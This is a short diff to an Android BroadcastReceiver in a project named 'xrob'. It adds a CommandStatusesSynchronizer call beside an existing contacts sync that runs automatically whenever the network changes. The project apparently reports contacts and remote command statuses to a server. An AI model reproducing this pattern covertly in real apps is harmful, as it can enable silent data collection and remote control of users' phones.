@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 
+import com.theah64.xrob.asynctasks.CommandStatusesSynchronizer;
 import com.theah64.xrob.asynctasks.ContactsSynchronizer;
 import com.theah64.xrob.utils.APIRequestGateway;
 import com.theah64.xrob.utils.PrefUtils;
@@ -33,6 +34,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
                 @Override
                 public void onReadyToRequest(String apiKey) {
                     new ContactsSynchronizer(context).execute(apiKey);
+                    new CommandStatusesSynchronizer(context).execute(apiKey);
                 }
 
                 @Override
